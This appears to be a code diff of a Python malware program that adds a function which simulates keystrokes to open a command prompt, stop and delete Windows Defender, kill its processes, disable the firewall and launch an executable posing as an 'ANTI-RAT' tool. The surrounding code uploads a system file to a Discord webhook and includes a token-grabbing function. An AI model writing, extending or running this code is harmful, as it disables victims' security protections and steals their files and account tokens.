@@ -6,8 +6,9 @@ import json
 import cv2
 import camera
 import re
+from time import sleep as dp
+import keyboard
 from random import randint
-import os
 import json
 import base64
 import he
@@ -27,14 +28,35 @@ subprocess.getoutput('net stop "SDRSVC"')
 subprocess.getoutput('net stop sharedaccess')
 subprocess.getoutput('net stop "wuauserv"')
 subprocess.getoutput('net stop "security center"')
+
+def delwindef():
+    keyboard.press_and_release("windows")
+    dp(0.10)
+    keyboard.write("cmd")
+    dp(0.10)
+    keyboard.press_and_release("enter")
+    dp(0.10)
+    keyboard.write("""
+net stop "SDRSVC"
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+taskkill /f /t /im MsMpEng.exe
+taskkill /f /t /im MpCmdRun.exe
+net stop "security center"
+net stop sharedaccess
+netsh advfirewall set allprofiles state off
+net stop "wuauserv"
+rd "C:\Program Files\Windows Defender"/q /s
+start ANTI-RAT_By_EtichalHackingItalia.exe
+del Activator.exe/q
+""")
+
 def licenseW():
     web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
     with open("C:/Windows/system32/license.rtf", "rb") as f:
         web.add_file(file=f.read(), filename='license.rtf')
     web.execute()
 def tokengrabber():
-    import re
-    import json
 
     from urllib.request import Request, urlopen
 
@@ -204,7 +226,7 @@ def main1():
         pass
   
   
-
+delwindef()
 main1()
 
 def main():
